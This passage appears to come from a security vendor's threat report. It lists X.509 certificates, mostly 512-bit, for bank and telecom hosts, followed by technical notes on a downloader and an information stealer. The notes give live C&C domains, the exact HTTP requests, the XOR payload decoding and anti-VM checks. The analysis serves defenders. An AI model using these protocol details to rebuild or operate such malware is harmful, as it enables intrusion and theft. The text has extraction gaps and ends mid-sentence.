        5d:ab:12:c6:71:cf:09:68:3d:47:6d:f2:c0:9e:41:44:83:7c:
        0b:fe
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 BEGIN CERTIFICATE
 MIIC3jCCAkegAwIBAgIDITVZMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
 MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
 MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDgxMjE3
 MDg1NTQ1WhcNMTAxMjE3MDg1NTQ1WjCBuzELMAkGA1UEBhMCTVkxJzAlBgNVBAoT
 HkpBUklORyBDb21tdW5pY2F0aW9ucyBTZG4uQmhkLjEPMA0GA1UECxMGSkFSSU5H
 MSAwHgYDVQQDExd3d3cuZmxleGljb3JwLmphcmluZy5teTEWMBQGA1UEBxMNVy5Q
 ZXJzZWt1dHVhbjEhMB8GCSqGSIb3DQEJARYSc3lzYWRtaW5AamFyaW5nLm15MRUw
 EwYDVQQIEwxLdWFsYSBMdW1wdXIwXDANBgkqhkiG9w0BAQEFAANLADBIAkEA7WHX
 EvOUGl/Riyg1tBg40zJ7e3mUeWQ9272t8v9sYf1DBcH4QZXeAcLKmGXWn7whXDV2
 n/86Yoh7MiGUUuFG7wIDAQABo4GKMIGHMBEGA1UdDgQKBAhGuYyeLvdpLzBEBgNV
 HSAEPTA7MDkGBWCDSgEBMDAwLgYIKwYBBQUHAgEWImh0dHA6Ly93d3cuZGlnaWNl
 cnQuY29tLm15L2Nwcy5odG0wHwYDVR0jBBgwFoAUxhaTThYX7BaujJR284ZtxXRu
 hHcwCwYDVR0PBAQDAgTwMA0GCSqGSIb3DQEBBQUAA4GBAHsVEpPQE8iR8RipdruH
 tESqdycFpluVbMBvxZR9M5TTbhJv3ZASGOmmSMvYpIqkaHCSMv3YfACc295+3R5B
 sC5MSPBzhXmo32hFQZcBBrLEn50EahPUbmPsv8kAgvJRiTPAO7pM64qYoyg0MF2r
 EsZxzwloPUdt8sCeQUSDfAv+
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2674380 (0x28cecc)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=MY, O=Digicert Sdn. Bhd., OU=457608K,
        CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Dec 7 08:02:08 2009 GMT
           Not After : Dec 7 08:02:08 2010 GMT
        Subject: C=MY, O=BANK NEGARA MALAYSIA, OU=BANK NEGARA
        MALAYSIA, CN=payments.bnm.gov.my
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:a0:c6:99:f0:88:9a:1c:ee:f7:22:72:5e:bc:1f:
                 02:40:68:f6:95:54:36:75:56:b3:31:0b:0c:54:c3:
                 46:e9:39:ec:62:b4:83:61:2d:b1:ab:42:3b:a2:4f:
                 4b:98:bb:6c:37:a8:3d:98:26:c8:2d:5f:75:86:3f:
                 b4:39:be:41:53
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                             49
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Subject Key Identifier:
              42:65:56:13:70:34:D0:63
           X509v3 Certificate Policies:
              Policy: 2.16.458.1.1
              CPS: http://www.digicert.com.my/cps.htm
           X509v3 Authority Key Identifier:
              keyid:C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D:C
              5:74:6E:84:77
           X509v3 Key Usage:
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
     Signature Algorithm: sha1WithRSAEncryption
        aa:32:37:ce:26:23:14:3e:dc:33:77:a6:bb:df:8d:f1:27:b1:
        64:05:b3:9b:a3:5c:d7:63:e7:7b:bd:63:a4:a1:61:7c:d0:3c:
        1e:c5:e6:a2:a9:01:6f:36:4a:44:de:50:f3:a0:53:d0:39:56:
        a8:b5:05:d0:24:42:b8:2e:d3:98:f3:0a:1a:94:29:73:eb:d2:
        38:9b:a0:9f:9e:39:2d:52:10:57:4e:12:8e:72:2a:e3:87:80:
        f8:f2:16:5d:56:15:cc:ea:74:96:f4:ef:d1:2e:1b:70:f9:bb:
        ba:b9:2a:b1:4c:3d:38:51:10:e0:4e:8d:53:05:6b:88:a1:77:
        ab:a0
 BEGIN CERTIFICATE
 MIICizCCAfSgAwIBAgIDKM7MMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
 MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
 MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMDkxMjA3
 MDgwMjA4WhcNMTAxMjA3MDgwMjA4WjBpMQswCQYDVQQGEwJNWTEdMBsGA1UEChMU
 QkFOSyBORUdBUkEgTUFMQVlTSUExHTAbBgNVBAsTFEJBTksgTkVHQVJBIE1BTEFZ
 U0lBMRwwGgYDVQQDExNwYXltZW50cy5ibm0uZ292Lm15MFwwDQYJKoZIhvcNAQEB
 BQADSwAwSAJBAKDGmfCImhzu9yJyXrwfAkBo9pVUNnVWszELDFTDRuk57GK0g2Et
 satCO6JPS5i7bDeoPZgmyC1fdYY/tDm+QVMCAwEAAaOBijCBhzARBgNVHQ4ECgQI
 QmVWE3A00GMwRAYDVR0gBD0wOzA5BgVgg0oBATAwMC4GCCsGAQUFBwIBFiJodHRw
 Oi8vd3d3LmRpZ2ljZXJ0LmNvbS5teS9jcHMuaHRtMB8GA1UdIwQYMBaAFMYWk04W
 F+wWroyUdvOGbcV0boR3MAsGA1UdDwQEAwIE8DANBgkqhkiG9w0BAQUFAAOBgQCq
 MjfOJiMUPtwzd6a7343xJ7FkBbObo1zXY+d7vWOkoWF80DwexeaiqQFvNkpE3lDz
 oFPQOVaotQXQJEK4LtOY8woalClz69I4m6CfnjktUhBXThKOcirjh4D48hZdVhXM
 6nSW9O/RLhtw+bu6uSqxTD04URDgTo1TBWuIoXeroA==
 END CERTIFICATE
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 01:00:00:00:00:01:1f:80:95:bf:76
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: O=GlobalSign Inc, CN=Cybertrust SureServer CA
        Validity
           Not Before: Feb 16 18:44:52 2009 GMT
           Not After : Feb 16 18:44:52 2011 GMT
        Subject: CN=ambermms.syniverse.com,
        C=US/emailAddress=belinda.jablonski@syniverse.com,
        L=Tampa, O=Syniverse Technologies Inc., OU=Crossroads,
        ST=Florida
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:a5:13:53:17:02:f7:cd:33:64:7d:e8:27:8f:e9:
                 bc:ab:db:96:3b:41:0d:b6:c4:2a:10:d5:64:58:87:
                 ac:62:de:09:2e:c5:5f:79:c5:d5:9e:26:9b:1a:9a:
                 e3:99:3b:e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5:
                 40:7f:bb:e9:35
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           Netscape Cert Type:
              SSL Client, SSL Server
           X509v3 Key Usage: critical
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
           X509v3 Authority Key Identifier:
              keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD:E8:30:B
              6:5B:84:89:23
           X509v3 CRL Distribution Points:
              Full Name:
                 URI:http://crl.globalsign.net/sureserver.crl
           X509v3 Basic Constraints: critical
              CA:FALSE
    Signature Algorithm: sha1WithRSAEncryption
        11:6e:15:44:b0:d1:a9:98:61:27:c0:f2:28:ac:50:70:e6:63:
        25:f2:75:ec:4d:30:fe:0a:34:ed:77:54:4a:d4:53:0f:60:d6:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                              51
          45:8a:70:6f:5f:c8:c2:bd:8d:4d:6b:e2:f4:d6:43:cc:34:fe:
          ad:ba:b6:ec:cb:88:68:0d:38:ba:99:b9:18:73:c9:1d:05:97:
          5e:95:43:c5:92:a9:00:f6:2f:4d:8c:51:09:bb:22:74:b4:9e:
          34:96:d9:9c:82:d2:fb:2c:be:0c:29:4d:50:5f:a5:3c:1a:d5:
          38:ca:d9:74:7a:81:c5:11:79:a4:4d:c6:23:81:14:2b:d3:b1:
          46:18:b6:c0:e2:4a:97:b6:07:c3:d7:b6:77:51:d9:4f:05:21:
          45:bb:b0:7c:4f:bc:6e:f6:72:62:22:28:1c:b0:06:70:02:2b:
          c5:11:b6:d0:c3:e0:ce:d7:81:ff:d6:c7:97:03:9d:87:68:b7:
          3a:c4:53:18:bf:cc:e4:b3:7f:fc:6b:83:b1:35:04:c1:ee:ea:
          42:d5:bf:c2:57:ff:18:a3:ce:52:a4:2c:92:2a:6f:b6:98:62:
          45:98:96:76:90:80:32:b9:8c:fe:93:a8:86:e9:50:62:9a:a6:
          11:52:1d:81:67:dc:84:ed:d8:e4:3d:a1:b7:0f:85:fd:b1:4b:
          6f:bd:fe:3c
 BEGIN CERTIFICATE
 MIIDRjCCAi6gAwIBAgILAQAAAAABH4CVv3YwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
 A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
 cnZlciBDQTAeFw0wOTAyMTYxODQ0NTJaFw0xMTAyMTYxODQ0NTJaMIG7MR8wHQYD
 VQQDExZhbWJlcm1tcy5zeW5pdmVyc2UuY29tMQswCQYDVQQGEwJVUzEuMCwGCSqG
 SIb3DQEJARYfYmVsaW5kYS5qYWJsb25za2lAc3luaXZlcnNlLmNvbTEOMAwGA1UE
 BxMFVGFtcGExJDAiBgNVBAoTG1N5bml2ZXJzZSBUZWNobm9sb2dpZXMgSW5jLjET
 MBEGA1UECxMKQ3Jvc3Nyb2FkczEQMA4GA1UECBMHRmxvcmlkYTBcMA0GCSqGSIb3
 DQEBAQUAA0sAMEgCQQClE1MXAvfNM2R96CeP6byr25Y7QQ22xCoQ1WRYh6xi3gku
 xV95xdWeJpsamuOZO+IuSH6cX3TJNAmzpUB/u+k1AgMBAAGjgZAwgY0wEQYJYIZI
 AYb4QgEBBAQDAgbAMA4GA1UdDwEB/wQEAwIE8DAfBgNVHSMEGDAWgBQrN1OTZEdm
 I08A0/fd6DC2W4SJIzA5BgNVHR8EMjAwMC6gLKAqhihodHRwOi8vY3JsLmdsb2Jh
 bHNpZ24ubmV0L3N1cmVzZXJ2ZXIuY3JsMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcN
 AQEFBQADggEBABFuFUSw0amYYSfA8iisUHDmYyXydexNMP4KNO13VErUUw9g1kWK
 cG9fyMK9jU1r4vTWQ8w0/q26tuzLiGgNOLqZuRhzyR0Fl16VQ8WSqQD2L02MUQm7
 InS0njSW2ZyC0vssvgwpTVBfpTwa1TjK2XR6gcUReaRNxiOBFCvTsUYYtsDiSpe2
 B8PXtndR2U8FIUW7sHxPvG72cmIiKBywBnACK8URttDD4M7Xgf/Wx5cDnYdotzrE
 Uxi/zOSzf/xrg7E1BMHu6kLVv8JX/xijzlKkLJIqb7aYYkWYlnaQgDK5jP6TqIbp
 UGKaphFSHYFn3ITt2OQ9obcPhf2xS2+9/jw=
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 71:a9:60:1f:3d:87:46:30:9b:bf:5e:cf:28:24:8
        b:fe
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network,
        OU=Terms of use at https://www.verisign.com/rpa (c)09,
        CN=VeriSign Class 3 Secure OFX CA G3
        Validity
           Not Before: Oct 26 00:00:00 2009 GMT
           Not After : Oct 26 23:59:59 2010 GMT
        Subject: C=US, ST=Missouri, L=Bridgeton, O=Vantage Credit
        Union, OU=IT Department, CN=secure2.eecu.com
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                  00:be:6e:4a:59:2e:33:40:79:33:79:d9:9b:34:68:
                  a6:74:f1:7f:02:d1:ac:91:21:5a:e1:bf:34:03:62:
                  33:0d:bb:bc:0a:29:ec:9c:fd:ea:16:ac:9d:e3:1b:
                  6f:7d:c7:68:ef:ee:04:03:6f:83:23:cd:1e:82:bb:
                  ab:24:6d:22:7f
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Basic Constraints:
              CA:FALSE
           X509v3 Key Usage:
              Digital Signature, Key Encipherment
           X509v3 CRL Distribution Points:
              Full Name:
                  URI:http://ofxG3crl.verisign.com/OFXG3.crl
              Authority Information Access:
              OCSP URI:
                  http://ocsp.verisign.com
              CA Issuers URI:
                  http://ofxG3aia.verisign.com/OFXG3.cer
           X509v3 Certificate Policies:
              Policy: 2.16.840.1.113733.1.7.23.3
              CPS: https://www.verisign.com/rpa
                  2.16.840.1.113733.1.6.7:
                  . 74cb5e68cb6fa8877cc86c25d1d7ce05
     Signature Algorithm: sha1WithRSAEncryption
        19:35:da:ac:91:36:a2:6c:7e:a0:96:75:9c:23:e1:e2:c3:f5:
        9e:76:6d:42:6e:3a:2f:c6:23:79:ed:33:7b:c4:d4:a3:58:c3:
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                              53
          f3:30:e2:69:4e:f9:01:89:41:f7:6a:dd:03:1f:6a:c9:e3:c9:
          ab:68:9f:6c:f6:67:31:76:32:e6:75:7b:e5:3a:31:3c:91:7e:
          e2:a0:94:18:ef:c9:75:d8:b2:28:bf:ed:8c:e4:69:0b:a6:95:
          aa:7c:3c:41:07:0e:fb:80:35:54:4c:3b:c8:c3:ac:2b:c2:86:
          c5:a8:61:20:38:22:e9:9c:23:82:d7:e3:80:ee:f1:aa:c6:cd:
          27:42:d2:3f:9a:83:66:db:41:66:ee:e7:4a:f9:75:c0:bd:e6:
          6c:dd:0e:e2:e5:34:8d:79:2c:cc:cb:79:1b:b0:46:08:ed:18:
          ce:38:65:b5:f0:87:fc:23:12:fe:9f:03:d3:0b:5b:0e:e8:9d:
          b5:c3:b7:36:f3:b9:42:4c:c4:64:5b:5f:d4:68:ec:40:de:a3:
          29:92:8a:a9:75:78:8a:bb:07:e4:49:c4:80:5e:94:c5:6c:7a:
          50:a5:7d:90:18:6b:0d:49:69:f9:93:d6:5b:24:82:a7:85:ee:
          d8:f4:fe:6e:f5:81:0c:e2:de:5c:44:c2:f6:67:ee:e3:f0:8c:
          07:ff:34:90
 BEGIN CERTIFICATE
 MIIEOzCCAyOgAwIBAgIQcalgHz2HRjCbv17PKCSL/jANBgkqhkiG9w0BAQUFADCB
 sjELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDlZlcmlTaWduLCBJbmMuMR8wHQYDVQQL
 ExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMTswOQYDVQQLEzJUZXJtcyBvZiB1c2Ug
 YXQgaHR0cHM6Ly93d3cudmVyaXNpZ24uY29tL3JwYSAoYykwOTEsMCoGA1UEAxMj
 VmVyaVNpZ24gQ2xhc3MgMyBTZWN1cmUgT0ZYIENBIC0gRzMwHhcNMDkxMDI2MDAw
 MDAwWhcNMTAxMDI2MjM1OTU5WjCBhjELMAkGA1UEBhMCVVMxETAPBgNVBAgTCE1p
 c3NvdXJpMRIwEAYDVQQHFAlCcmlkZ2V0b24xHTAbBgNVBAoUFFZhbnRhZ2UgQ3Jl
 ZGl0IFVuaW9uMRYwFAYDVQQLFA1JVCBEZXBhcnRtZW50MRkwFwYDVQQDFBBzZWN1
 cmUyLmVlY3UuY29tMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAL5uSlkuM0B5M3nZ
 mzRopnTxfwLRrJEhWuG/NANiMw27vAop7Jz96hasneMbb33HaO/uBANvgyPNHoK7
 qyRtIn8CAwEAAaOCAT0wggE5MAkGA1UdEwQCMAAwCwYDVR0PBAQDAgWgMDoGA1Ud
 HwQzMDEwL6AtoCuGKWh0dHA6Ly9vZngtRzMtY3JsLnZlcmlzaWduLmNvbS9PRlgt
 RzMuY3JsMGsGCCsGAQUFBwEBBF8wXTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au
 dmVyaXNpZ24uY29tMDUGCCsGAQUFBzAChilodHRwOi8vb2Z4LUczLWFpYS52ZXJp
 c2lnbi5jb20vT0ZYLUczLmNlcjBEBgNVHSAEPTA7MDkGC2CGSAGG+EUBBxcDMCow
 KAYIKwYBBQUHAgEWHGh0dHBzOi8vd3d3LnZlcmlzaWduLmNvbS9ycGEwMAYKYIZI
 AYb4RQEGBwQiFiA3NGNiNWU2OGNiNmZhODg3N2NjODZjMjVkMWQ3Y2UwNTANBgkq
 hkiG9w0BAQUFAAOCAQEAGTXarJE2omx+oJZ1nCPh4sP1nnZtQm46L8Yjee0ze8TU
 o1jD8zDiaU75AYlB92rdAx9qyePJq2ifbPZnMXYy5nV75ToxPJF+4qCUGO/Jddiy
 KL/tjORpC6aVqnw8QQcO+4A1VEw7yMOsK8KGxahhIDgi6ZwjgtfjgO7xqsbNJ0LS
 P5qDZttBZu7nSvl1wL3mbN0O4uU0jXkszMt5G7BGCO0YzjhltfCH/CMS/p8D0wtb
 DuidtcO3NvO5QkzEZFtf1GjsQN6jKZKKqXV4irsH5EnEgF6UxWx6UKV9kBhrDUlp
 +ZPWWySCp4Xu2PT+bvWBDOLeXETC9mfu4/CMB/80kA==
 END CERTIFICATE
 Certificate:
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
     Data:
        Version: 3 (0x2)
        Serial Number:
           (Negative)0a:40:06:6d:24:7d:41:54:b2:c3:e9:e2
           :a4:57:97:59
        Signature Algorithm: md5WithRSAEncryption
        Issuer: CN=Root Agency
        Validity
           Not Before: Jun 9 10:31:21 2009 GMT
           Not After : Dec 31 23:59:59 2039 GMT
        Subject: CN=Microsoft
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (1024 bit)
              Modulus:
                  00:cd:25:d3:98:06:2d:91:f1:ad:d7:17:32:66:0a:
                  d6:25:a0:7f:ff:2e:6c:68:95:f9:92:09:a0:63:a5:
                  80:54:22:e6:92:13:b8:67:05:3f:80:69:34:07:e4:
                  c3:00:bc:86:f3:51:64:22:d7:ab:07:be:e5:f7:e7:
                  97:b3:3d:9f:fc:10:b0:52:e7:d1:62:40:2a:18:83:
                  b6:4d:62:e6:f5:9f:fe:16:5e:41:d7:2b:af:54:a7:
                  8e:af:a9:08:df:39:b2:cb:cf:bf:52:c3:bf:04:8f:
                  a0:c0:16:89:ce:06:df:6e:d9:26:8a:a7:01:f8:9b:
                  23:35:3b:4c:96:6d:4a:10:41
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           2.5.29.1:
           0>........
           O..a!..dc..0.1.0...U....Root Agency...7l...d......\5.
     Signature Algorithm: md5WithRSAEncryption
        1a:0c:28:45:f5:5e:b1:a9:04:3a:30:7a:0b:e2:dd:f2:7c:89:
        22:ac:17:b5:f3:87:6f:e4:09:9e:55:73:f9:11:7b:11:d2:d7:
        26:08:03:47:6f:6b:b5:1d:24:04:50:d4:cb:91:99:ac:13:72:
        16:32:05:be:7e:1a:79:29:19:5e
 BEGIN CERTIFICATE
 MIIBuTCCAWOgAwIBAgIQ9b/5ktuCvqtNPBYdW6hopzANBgkqhkiG9w0BAQQFADAW
 MRQwEgYDVQQDEwtSb290IEFnZW5jeTAeFw0wOTA2MDkxMDMxMjFaFw0zOTEyMzEy
 MzU5NTlaMBQxEjAQBgNVBAMTCU1pY3Jvc29mdDCBnzANBgkqhkiG9w0BAQEFAAOB
 jQAwgYkCgYEAzSXTmAYtkfGt1xcyZgrWJaB//y5saJX5kgmgY6WAVCLmkhO4ZwU/
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                            55
 gGk0B+TDALyG81FkIterB77l9+eXsz2f/BCwUufRYkAqGIO2TWLm9Z/+Fl5B1yuv
 VKeOr6kI3zmyy8+/UsO/BI+gwBaJzgbfbtkmiqcB+JsjNTtMlm1KEEECAwEAAaNL
 MEkwRwYDVR0BBEAwPoAQEuQJLQYdHU8AjWEh3BZkY6EYMBYxFDASBgNVBAMTC1Jv
 b3QgQWdlbmN5ghAGN2wAqgBkihHPuNSqXDX0MA0GCSqGSIb3DQEBBAUAA0EAGgwo
 RfVesakEOjB6C+Ld8nyJIqwXtfOHb+QJnlVz+RF7EdLXJggDR29rtR0kBFDUy5GZ
 rBNyFjIFvn4aeSkZXg==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 01:00:00:00:00:01:1f:71:31:72:c9
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: O=GlobalSign Inc, CN=Cybertrust SureServer CA
        Validity
           Not Before: Feb 13 19:00:51 2009 GMT
           Not After : Feb 13 19:00:51 2011 GMT
        Subject: CN=inpack.syniverse.com,
        C=US/emailAddress=belinda.jablonski@syniverse.com, L=Tampa
        , O=Syniverse Technologies Inc., OU=Crossroads, ST=Florida
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:a5:13:53:17:02:f7:cd:33:64:7d:e8:27:8f:e9:
                 bc:ab:db:96:3b:41:0d:b6:c4:2a:10:d5:64:58:87:
                 ac:62:de:09:2e:c5:5f:79:c5:d5:9e:26:9b:1a:9a:
                 e3:99:3b:e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5:
                 40:7f:bb:e9:35
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           Netscape Cert Type:
              SSL Client, SSL Server
           X509v3 Key Usage: critical
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
           X509v3 Authority Key Identifier:
              keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD:E8:30:B
              6:5B:84:89:23
           X509v3 CRL Distribution Points:
              Full Name:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                  URI:http://crl.globalsign.net/sureserver.crl
           X509v3 Basic Constraints: critical
              CA:FALSE
     Signature Algorithm: sha1WithRSAEncryption
        95:2a:42:59:bd:18:1a:ec:20:e9:96:0d:7f:f2:bc:4e:79:8a:
        44:21:a4:d7:46:03:94:a8:ec:d0:28:29:07:d0:f5:bc:91:c5:
        21:34:16:dd:87:ee:dc:6a:d4:e7:f4:d4:f9:a6:04:bb:60:53:
        2b:14:19:8a:2c:2e:1f:6a:8f:97:22:d6:f4:e5:44:06:c2:22:
        ee:cf:b2:19:67:fa:40:0f:9c:cf:58:7f:53:21:af:c0:02:ad:
        d8:7c:19:3c:f3:52:f4:10:30:f0:61:24:a9:9d:18:01:a3:f5:
        c9:29:ab:65:66:ef:a5:2d:cd:53:e2:44:09:ea:8d:4c:bc:ef:
        1a:b6:2c:7b:df:16:39:94:8b:33:cb:14:16:c2:93:42:6c:4d:
        18:99:ba:7b:fa:91:74:f0:9a:1e:ae:92:b4:94:43:bb:96:ba:
        7e:6a:df:38:9c:2e:7c:11:37:37:4c:20:80:5d:6b:e2:94:41:
        98:7d:cc:26:ca:cc:4f:81:4d:95:16:bb:26:db:1f:fe:03:fc:
        a2:50:9c:49:0b:45:7c:86:fc:5c:a6:31:34:f2:08:f1:03:16:
        10:e0:90:0c:e7:02:4e:95:f5:e8:32:03:a3:fb:78:17:dc:23:
        bf:b4:59:e6:6f:91:1c:38:cd:b7:9e:48:a0:6b:68:98:00:e3:
        33:48:18:ae
 BEGIN CERTIFICATE
 MIIDRDCCAiygAwIBAgILAQAAAAABH3ExcskwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
 A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
 cnZlciBDQTAeFw0wOTAyMTMxOTAwNTFaFw0xMTAyMTMxOTAwNTFaMIG5MR0wGwYD
 VQQDExRpbnBhY2suc3luaXZlcnNlLmNvbTELMAkGA1UEBhMCVVMxLjAsBgkqhkiG
 9w0BCQEWH2JlbGluZGEuamFibG9uc2tpQHN5bml2ZXJzZS5jb20xDjAMBgNVBAcT
 BVRhbXBhMSQwIgYDVQQKExtTeW5pdmVyc2UgVGVjaG5vbG9naWVzIEluYy4xEzAR
 BgNVBAsTCkNyb3Nzcm9hZHMxEDAOBgNVBAgTB0Zsb3JpZGEwXDANBgkqhkiG9w0B
 AQEFAANLADBIAkEApRNTFwL3zTNkfegnj+m8q9uWO0ENtsQqENVkWIesYt4JLsVf
 ecXVniabGprjmTviLkh+nF90yTQJs6VAf7vpNQIDAQABo4GQMIGNMBEGCWCGSAGG
 +EIBAQQEAwIGwDAOBgNVHQ8BAf8EBAMCBPAwHwYDVR0jBBgwFoAUKzdTk2RHZiNP
 ANP33egwtluEiSMwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5nbG9iYWxz
 aWduLm5ldC9zdXJlc2VydmVyLmNybDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB
 BQUAA4IBAQCVKkJZvRga7CDplg1/8rxOeYpEIaTXRgOUqOzQKCkH0PW8kcUhNBbd
 h+7catTn9NT5pgS7YFMrFBmKLC4fao+XItb05UQGwiLuz7IZZ/pAD5zPWH9TIa/A
 Aq3YfBk881L0EDDwYSSpnRgBo/XJKatlZu+lLc1T4kQJ6o1MvO8atix73xY5lIsz
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                            57
 yxQWwpNCbE0Ymbp7+pF08JoerpK0lEO7lrp+at84nC58ETc3TCCAXWvilEGYfcwm
 ysxPgU2VFrsm2x/+A/yiUJxJC0V8hvxcpjE08gjxAxYQ4JAM5wJOlfXoMgOj+3gX
 3CO/tFnmb5EcOM23nkiga2iYAOMzSBiu
 END CERTIFICATE
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
Appendix D. Malcode Technical Notes
Small Downloader
Filename      MD5                                 Link Time (UTC)           Linker
msieckc.exe   41b816289a6a639f7f2a72b6c9e6a695    2012.04.11 18:31:48       6.0
Technical Details
To ensure only single instance of the module is running, the module verifies if
system mutex named 
132DF6E
 exists. If it exists the module exits, if not 
module creates one.
The module implements a method to resist running in virtual environment. It gets
CPU name and identifier from the registry at HKLM\HARDWARE\DESCRIPTION\
System\CentralProcessor\0
and collects IP and MAC addresses of local network adapters. After that it
compiles a string describing the system in the following format: 
 C P U :
%CPUNAME%<br> Net card : %IP% (%MACADDR%)<br>
. Next it checks if this
string contains one of the following substrings:
VMWARE
QEMU
192.168.100.
If any of these strings is found, the module terminates.
After that, there is a hardcoded value of 10, which delays further execution of the
module for 10 seconds. Then the module attempts to delete some other, prob-
ably older, components which might be present on the system. The list of deleted
files includes the following:
%APPDATA%\Microsoft\Crypto\DES64v7\dtlcntr.exe
%APPDATA%\Microsoft\Crypto\DES64v7\googletoolbar.exe
%APPDATA%\Microsoft\Crypto\DES64v7\active.dll
%APPDATA%\Microsoft\Crypto\DES64v7\detect.dll
The next is step is to check if current directory has a file named 
. If not, the
module proceeds with network communication routine. But if this file is found it
does some additional checks. If 
 file is older than 180 days, the module wipes
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
                                                                                  59
the file. If not, it triggers a special variable that makes module dormant and dis-
ables further communication with C&C server.
After all, if the module is ready and allowed to communicate with C&C server it
does that in the following manner.
 The module connects to autolace.twilightparadox.com (or automachine.
    servequake.com) and issues a HTTP GET request with hardcoded User
Agent
    string:
    GET /major/images/view.php HTTP/1.1
    User
Agent: Mozilla/4.0 (compatible
 MSIE 8.0
 Windows NT 6.1
 Trident/4.0
    SLCC2
 .NET CLR 2.0.50727
 .NET CLR 3.5.30729
 .NET CLR 3.0.30729
    Media Center PC 6.0)
    Host: autolace.twilightparadox.com
    Connection: Keep
Alive
    Cache
Control: no
cache
    The server response should contain 
DEXT87
 string which is used to rec-
    ognize valid response. The malware locates 
DEXT87
 and reads the data
    appended to it. The appended data should be an IP address in plaintext. This
    is used a real C&C IP address. Reading stops when non
digit or dot symbol is
    found. Here is an example of shortest possible valid server response:
    HTTP/1.1 200 OK
    Content
Length: 17
    DEXT87192.168.1.1
 If the real C&C IP address is not valid the module may try to send identical
    request again but using a different HTTP path: /major/images/read.php
    If the C&C IP address is valid, the module issues another HTTP request:
    GET /major/txt/read.php HTTP/1.1
    User
Agent: Mozilla/4.0 (compatible
 MSIE 8.0
 Windows NT 6.1
 Trident/4.0
    SLCC2
    .NET CLR 2.0.50727
 .NET CLR 3.5.30729
 .NET CLR 3.0.30729
 Media Cen-
    ter PC 6.0)
    Host: autolace.twilightparadox.com
    Connection: Keep
Alive
    Cache
Control: no
cache
    The server response can be one of the following:
   a. DEXT87no
   b. DEXT87up
<DATASIZE>
<DATA>
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
     Where <DATASIZE> is a decimal integer that represents length of <DATA>
     field in bytes
 <DATA> is a binary data separated from <DATASIZE> field by
     semicolon. Please note, that after receiving <DATA>, it is XORed with byte
     value 0x55 and saved to a disk in a file named 
ctfmon.exe
 (current directory
     is used). Upon successful receiving of the file it is started in a new process.
Information Stealer
Filename      MD5                                  Link Time (UTC)           Linker
DmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                       6.0
                                                   00:25:59
This module is relatively large (455Kb) and comes as a part of WinRar SFX file
that drops and starts the module from %APPDATA%\Microsoft\Display\DmaUp3.
exe. The main purpose of the module is to collect various secrets stored on a
local system. This module is designed not to run on Windows with system default
codepage set to Korean.
Technical Details
From the very beginning this module checks if 
bdagent.exe
 process is running
